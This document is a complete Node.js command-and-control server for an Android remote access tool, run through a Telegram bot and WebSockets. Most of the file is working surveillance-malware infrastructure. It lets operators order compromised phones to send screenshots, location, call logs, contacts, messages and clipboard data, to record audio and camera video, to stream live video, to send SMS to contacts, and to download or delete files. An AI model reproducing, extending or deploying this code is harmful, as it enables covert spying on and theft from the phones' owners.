const express = require('express');
const session = require('express-session');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');

// ==================== CONFIG ====================
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const ADMIN_ID = process.env.ADMIN_ID || '7489978949'; // अपनी ID डालो

// ==================== DATA STORAGE ====================
let authorizedUsers = new Set();
const USERS_FILE = './users.json';
try {
    const data = fs.readFileSync(USERS_FILE);
    JSON.parse(data).forEach(id => authorizedUsers.add(id.toString()));
} catch (e) {
    authorizedUsers.add(ADMIN_ID);
    saveUsers();
}
function saveUsers() {
    fs.writeFileSync(USERS_FILE, JSON.stringify([...authorizedUsers]));
}

const userDevices = new Map(); // userId -> Map(deviceId -> info)
const deviceToUser = new Map(); // deviceId -> userId
const liveViewers = new Map();   // deviceId -> Set(webSocket)
const userSession = new Map();   // userId -> { currentUuid, currentNumber, currentTitle }

// ==================== EXPRESS SETUP ====================
const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: 'your-secret-key-change-this',
    resave: false,
    saveUninitialized: true,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==================== TELEGRAM BOT ====================
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ==================== MULTER ====================
const upload = multer();

// ==================== HELPERS ====================
function isAuthorized(chatId) {
    return authorizedUsers.has(chatId.toString());
}
function getDeviceOwner(deviceId) {
    return deviceToUser.get(deviceId);
}
function sendCommandToDevice(deviceId, command) {
    let sent = false;
    wss.clients.forEach(ws => {
        if (ws.uuid === deviceId && ws.readyState === WebSocket.OPEN) {
            ws.send(command);
            sent = true;
        }
    });
    return sent;
}
function extractUserId(req) {
    // Try query param, then header, then fallback to URL regex
    let userId = req.query.userId || req.headers.userid;
    if (!userId) {
        const match = req.originalUrl.match(/[?&]userId=(\d+)/);
        if (match) userId = match[1];
    }
    return userId;
}

// ==================== TELEGRAM COMMANDS ====================
bot.onText(/\/adduser (\d+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    const newUser = match[1];
    authorizedUsers.add(newUser);
    saveUsers();
    bot.sendMessage(chatId, `✅ User ${newUser} added.`);
});

bot.onText(/\/removeuser (\d+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    const user = match[1];
    if (authorizedUsers.has(user)) {
        authorizedUsers.delete(user);
        saveUsers();
        bot.sendMessage(chatId, `✅ User ${user} removed.`);
    } else {
        bot.sendMessage(chatId, `❌ User not found.`);
    }
});

bot.onText(/\/listusers/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    const users = [...authorizedUsers].join('\n');
    bot.sendMessage(chatId, `Authorized users:\n${users}`);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (!isAuthorized(chatId)) {
        return bot.sendMessage(chatId, '⛔ You are not authorized. Contact admin.');
    }
    bot.sendMessage(chatId,
        '°• Welcome to Multi-User Panel\n\nUse buttons below.',
        {
            reply_markup: {
                keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                resize_keyboard: true
            }
        }
    );
});

// Handle all messages (including replies)
bot.on('message', async (msg) => {
    const chatId = msg.chat.id.toString();
    if (!isAuthorized(chatId) || !msg.text) return;

    // Initialize session
    if (!userSession.has(chatId)) {
        userSession.set(chatId, { currentUuid: '', currentNumber: '', currentTitle: '' });
    }
    const session = userSession.get(chatId);

    // Handle reply flows
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text || '';
        if (replyText.includes('Reply with the phone number')) {
            session.currentNumber = msg.text;
            await bot.sendMessage(chatId, 'Now enter the message:', { reply_markup: { force_reply: true } });
            return;
        }
        if (replyText.includes('Enter the message you want to send')) {
            if (session.currentUuid) {
                sendCommandToDevice(session.currentUuid, `send_message:${session.currentNumber}/${msg.text}`);
                session.currentNumber = '';
                session.currentUuid = '';
            }
            await bot.sendMessage(chatId, 'Request sent.', {
                reply_markup: {
                    keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    resize_keyboard: true
                }
            });
            return;
        }
        // Add more reply handlers similarly...
    }

    // Main menu buttons
    if (msg.text === 'ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs') {
        const devices = userDevices.get(chatId);
        if (!devices || devices.size === 0) {
            await bot.sendMessage(chatId, 'No connected devices.');
        } else {
            let text = 'Connected devices:\n';
            devices.forEach((info, id) => {
                text += `• ${info.model} (${info.battery})\n`;
            });
            await bot.sendMessage(chatId, text);
        }
        return;
    }

    if (msg.text === 'ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ') {
        const devices = userDevices.get(chatId);
        if (!devices || devices.size === 0) {
            await bot.sendMessage(chatId, 'No devices.');
        } else {
            const keyboard = [];
            devices.forEach((info, id) => {
                keyboard.push([{ text: info.model, callback_data: `device:${id}` }]);
            });
            await bot.sendMessage(chatId, 'Select device:', {
                reply_markup: { inline_keyboard: keyboard }
            });
        }
        return;
    }
});

// Callback query handler (with proper error handling)
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id.toString();
    if (!isAuthorized(chatId)) {
        await bot.answerCallbackQuery(query.id, { text: 'Unauthorized' });
        return;
    }
    const [cmd, param] = query.data.split(':');

    try {
        if (cmd === 'device') {
            const deviceId = param;
            if (getDeviceOwner(deviceId) !== chatId) {
                await bot.answerCallbackQuery(query.id, { text: 'Not your device' });
                return;
            }
            const session = userSession.get(chatId) || {};
            session.currentUuid = deviceId;
            userSession.set(chatId, session);

            const deviceInfo = userDevices.get(chatId)?.get(deviceId);
            if (!deviceInfo) return;

            // Build inline keyboard (make sure it's not empty)
            const keyboard = [
                [{ text: '📸 Screenshot', callback_data: `screenshot:${deviceId}` }],
                [{ text: '📍 Location', callback_data: `location:${deviceId}` }],
                [{ text: '📞 Call Logs', callback_data: `calls:${deviceId}` }],
                [{ text: '👥 Contacts', callback_data: `contacts:${deviceId}` }],
                [{ text: '✉️ Send SMS', callback_data: `send_message:${deviceId}` }],
                [{ text: '📷 Main Camera', callback_data: `camera_main:${deviceId}` }],
                [{ text: '🤳 Selfie Camera', callback_data: `camera_selfie:${deviceId}` }],
                [{ text: '🎤 Microphone', callback_data: `microphone:${deviceId}` }],
                [{ text: '💬 Toast', callback_data: `toast:${deviceId}` }],
                [{ text: '🔔 Notification', callback_data: `show_notification:${deviceId}` }],
            ];

            await bot.editMessageText(`Commands for ${deviceInfo.model}:`, {
                chat_id: chatId,
                message_id: query.message.message_id,
                reply_markup: { inline_keyboard: keyboard }
            });
            await bot.answerCallbackQuery(query.id);
            return;
        }

        // Simple commands (no input)
        const simpleCommands = ['screenshot', 'location', 'calls', 'contacts', 'clipboard', 'whatsapp', 'messages', 'vibrate', 'device_info'];
        if (simpleCommands.includes(cmd)) {
            const deviceId = param;
            if (getDeviceOwner(deviceId) !== chatId) {
                await bot.answerCallbackQuery(query.id, { text: 'Not yours' });
                return;
            }
            sendCommandToDevice(deviceId, cmd);
            await bot.deleteMessage(chatId, query.message.message_id);
            await bot.sendMessage(chatId, 'Command sent.', {
                reply_markup: {
                    keyboard: [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    resize_keyboard: true
                }
            });
            await bot.answerCallbackQuery(query.id);
            return;
        }

        // Commands that need text input
        const inputCommands = ['send_message', 'send_message_to_all', 'file', 'delete_file', 'microphone', 'camera_main', 'camera_selfie', 'toast', 'show_notification', 'play_audio'];
        if (inputCommands.includes(cmd)) {
            const deviceId = param;
            if (getDeviceOwner(deviceId) !== chatId) {
                await bot.answerCallbackQuery(query.id, { text: 'Not yours' });
                return;
            }
            let prompt = 'Enter required input:';
            if (cmd === 'send_message') prompt = 'Reply with the phone number:';
            if (cmd === 'send_message_to_all') prompt = 'Enter message for all contacts:';
            if (cmd === 'file') prompt = 'Enter file path to download:';
            if (cmd === 'delete_file') prompt = 'Enter file path to delete:';
            if (cmd === 'microphone') prompt = 'Recording duration (seconds):';
            if (cmd === 'camera_main' || cmd === 'camera_selfie') prompt = 'Recording duration (seconds):';
            if (cmd === 'toast') prompt = 'Toast message:';
            if (cmd === 'show_notification') prompt = 'Notification title:';
            if (cmd === 'play_audio') prompt = 'Audio URL:';

            await bot.editMessageText(prompt, {
                chat_id: chatId,
                message_id: query.message.message_id,
                reply_markup: { force_reply: true }
            });
            await bot.answerCallbackQuery(query.id);
            return;
        }

        await bot.answerCallbackQuery(query.id, { text: 'Unknown command' });
    } catch (error) {
        console.error('Callback query error:', error);
        try {
            await bot.answerCallbackQuery(query.id, { text: 'Error processing request' });
        } catch (e) {}
    }
});

// ==================== WEBSOCKET ====================
wss.on('connection', (ws, req) => {
    try {
        console.log('🔌 Connection attempt from', req.socket.remoteAddress, req.url);
        const urlParams = new URLSearchParams(req.url.split('?')[1] || '');
        const userId = urlParams.get('userId');
        const path = req.url.split('?')[0];

        // Live viewer connection
        if (path === '/live') {
            const deviceId = urlParams.get('deviceId');
            const viewerId = urlParams.get('userId');
            if (!deviceId || !viewerId || getDeviceOwner(deviceId) !== viewerId) {
                ws.close(1008, 'Unauthorized');
                return;
            }
            if (!liveViewers.has(deviceId)) liveViewers.set(deviceId, new Set());
            liveViewers.get(deviceId).add(ws);
            ws.on('close', () => {
                liveViewers.get(deviceId).delete(ws);
                if (liveViewers.get(deviceId).size === 0) liveViewers.delete(deviceId);
            });
            return;
        }

        // Device connection
        if (!userId || !authorizedUsers.has(userId)) {
            ws.close(1008, 'Unauthorized');
            return;
        }

        const deviceId = uuidv4();
        const model = req.headers.model || 'Unknown';
        const battery = req.headers.battery || 'Unknown';
        const version = req.headers.version || 'Unknown';
        const brightness = req.headers.brightness || 'Unknown';
        const provider = req.headers.provider || 'Unknown';

        ws.uuid = deviceId;
        ws.userId = userId;

        if (!userDevices.has(userId)) userDevices.set(userId, new Map());
        userDevices.get(userId).set(deviceId, { model, battery, version, brightness, provider, ws });
        deviceToUser.set(deviceId, userId);

        bot.sendMessage(userId, `✅ New device connected: ${model} (${battery})`).catch(console.error);

        ws.on('message', (data) => {
            try {
                if (Buffer.isBuffer(data) && data.length > 6 && data.slice(0,6).toString() === 'frame:') {
                    const frame = data.slice(6);
                    const viewers = liveViewers.get(deviceId);
                    if (viewers) {
                        viewers.forEach(v => {
                            if (v.readyState === WebSocket.OPEN) v.send(frame);
                        });
                    }
                } else {
                    console.log(`📨 Message from ${deviceId}: ${data}`);
                }
            } catch (e) {
                console.error('Error handling message:', e);
            }
        });

        ws.on('close', () => {
            userDevices.get(userId)?.delete(deviceId);
            deviceToUser.delete(deviceId);
            bot.sendMessage(userId, `❌ Device disconnected: ${model}`).catch(console.error);
        });
    } catch (error) {
        console.error('WebSocket connection error:', error);
        ws.close();
    }
});

// ==================== HTTP ENDPOINTS (from device) ====================
app.post("/uploadFile", upload.single('file'), (req, res) => {
    try {
        const userId = extractUserId(req);
        if (!userId || !authorizedUsers.has(userId)) {
            return res.status(403).send('Unauthorized');
        }
        bot.sendDocument(userId, req.file.buffer, { caption: `File from ${req.headers.model || 'device'}` })
            .catch(console.error);
        res.send('');
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Server error');
    }
});

app.post("/uploadText", (req, res) => {
    try {
        const userId = extractUserId(req);
        if (!userId || !authorizedUsers.has(userId)) {
            return res.status(403).send('Unauthorized');
        }
        bot.sendMessage(userId, `Text from ${req.headers.model || 'device'}:\n${req.body.text || ''}`)
            .catch(console.error);
        res.send('');
    } catch (error) {
        console.error('Text error:', error);
        res.status(500).send('Server error');
    }
});

app.post("/uploadLocation", (req, res) => {
    try {
        const userId = extractUserId(req);
        if (!userId || !authorizedUsers.has(userId)) {
            return res.status(403).send('Unauthorized');
        }
        bot.sendLocation(userId, req.body.lat, req.body.lon)
            .catch(console.error);
        bot.sendMessage(userId, `Location from ${req.headers.model || 'device'}`)
            .catch(console.error);
        res.send('');
    } catch (error) {
        console.error('Location error:', error);
        res.status(500).send('Server error');
    }
});

// ==================== WEB INTERFACE ====================
function requireLogin(req, res, next) {
    if (!req.session.userId) return res.redirect('/login');
    next();
}

app.get('/login', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Login</title></head>
        <body>
            <h2>Login with Telegram ID</h2>
            <form method="POST" action="/login">
                <input type="text" name="userId" placeholder="Your Telegram ID" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
    `);
});

app.post('/login', (req, res) => {
    const { userId } = req.body;
    if (authorizedUsers.has(userId)) {
        req.session.userId = userId;
        res.redirect('/dashboard');
    } else {
        res.send('Unauthorized');
    }
});

app.get('/dashboard', requireLogin, (req, res) => {
    const userId = req.session.userId;
    const devices = userDevices.get(userId) || new Map();
    let list = '';
    devices.forEach((info, id) => {
        list += `<li>${info.model} - <a href="/stream/${id}">Live Camera</a></li>`;
    });
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Dashboard</title></head>
        <body>
            <h1>Your Devices</h1>
            <ul>${list || '<li>No devices</li>'}</ul>
            <a href="/logout">Logout</a>
        </body>
        </html>
    `);
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

app.get('/stream/:deviceId', requireLogin, (req, res) => {
    const userId = req.session.userId;
    const deviceId = req.params.deviceId;
    if (getDeviceOwner(deviceId) !== userId) return res.status(403).send('Forbidden');
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Live Stream</title>
            <style>canvas { width: 100%; max-width: 640px; }</style>
        </head>
        <body>
            <h2>Live Camera</h2>
            <canvas id="canvas"></canvas>
            <script>
                const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/live?deviceId=${deviceId}&userId=${userId}');
                ws.binaryType = 'blob';
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                ws.onmessage = (e) => {
                    const url = URL.createObjectURL(e.data);
                    const img = new Image();
                    img.onload = () => {
                        canvas.width = img.width;
                        canvas.height = img.height;
                        ctx.drawImage(img, 0, 0);
                        URL.revokeObjectURL(url);
                    };
                    img.src = url;
                };
                ws.onclose = () => document.body.innerHTML += '<p>Connection closed</p>';
            </script>
        </body>
        </html>
    `);
});

app.get('/', (req, res) => {
    res.send('<h1>Server is running</h1>');
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🌐 Web: http://localhost:${PORT}`);
    console.log(`🔌 WebSocket: ws://localhost:${PORT}`);
});
